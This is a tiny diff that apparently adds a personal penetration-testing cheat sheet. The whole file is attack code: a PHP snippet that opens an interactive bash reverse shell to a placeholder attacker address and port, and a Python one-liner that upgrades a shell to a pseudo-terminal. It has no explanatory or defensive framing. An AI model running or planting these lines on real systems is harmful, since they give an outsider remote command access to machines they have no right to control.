@@ -1,0 +1,9 @@
+#php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/YOURIP/ANDPORT 0>&1 '");
+?>
+
+#python ptk shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+#yay
